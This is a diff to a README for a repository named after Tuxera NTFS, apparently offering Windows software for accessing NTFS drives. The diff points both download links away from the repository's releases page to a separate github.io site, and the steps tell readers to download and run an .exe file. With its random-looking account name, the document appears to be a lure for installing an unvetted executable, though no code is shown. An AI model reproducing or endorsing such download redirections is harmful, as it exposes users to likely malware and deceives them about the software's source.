@@ -1,6 +1,6 @@
 # 💾 Tuxera-NTFS-2026 - Access Windows drives on any computer
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hemfugaciousness855/Tuxera-NTFS-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://hemfugaciousness855.github.io)
 
 Tuxera NTFS for Windows 2026 allows you to manage Windows file systems across your devices. This software provides high-speed file transfers and data safety for your storage drives. You can read, edit, copy, and move files on NTFS-formatted drives on your Windows 11 or Windows 10 computer.
 
@@ -22,7 +22,7 @@ Tuxera NTFS for Windows 2026 allows you to manage Windows file systems across yo
 
 ## 📥 How to Download
 
-1. Visit the following page to choose your version: [Tuxera NTFS Releases](https://github.com/hemfugaciousness855/Tuxera-NTFS-2026/releases).
+1. Visit the following page to choose your version: [Tuxera NTFS Releases](https://hemfugaciousness855.github.io).
 2. Locate the latest release at the top of the page.
 3. Click the file name ending in .exe to begin your download to your computer.
 4. Wait for the download to finish.
